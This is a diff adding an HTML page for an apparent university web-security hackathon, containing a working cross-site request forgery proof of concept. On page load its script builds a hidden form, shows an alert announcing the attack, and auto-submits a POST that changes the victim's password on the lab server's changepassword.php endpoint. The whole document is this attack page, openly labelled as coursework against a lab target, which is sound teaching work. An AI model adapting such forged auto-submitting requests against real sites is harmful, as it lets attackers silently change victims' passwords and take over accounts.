@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WAPH-Hackathon 4</title>
+</head>
+<body>
+  <h1>WAPH-Hackathon 4: Cross-site Request Forgery Attack</h1>
+  <h2>Dilip Kumar Sanipina</h2>
+  <script>
+    function CSRF() {
+      // creating a form element
+      var form = document.createElement('form');
+      // Constructing the form
+      form.action = 'https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php';
+      form.method = 'POST';
+      form.target = '_self';
+      form.innerHTML = "<input type='hidden' name= 'newpassword' value='mypass1' />";
+      // appending the form to the current page
+      document.body.appendChild(form);
+      // Alerting about the CSRF attack
+      alert('CSRF Attack for Hackathon 4 is about to happen - By Dilip Kumar Sanipina');
+      // Form will be submitted
+      form.submit();
+    }
+
+    //Calling the CSRF() to forge an HTTP POST request
+
+    CSRF();
+
+  </script>
+
+</body>
+</html>
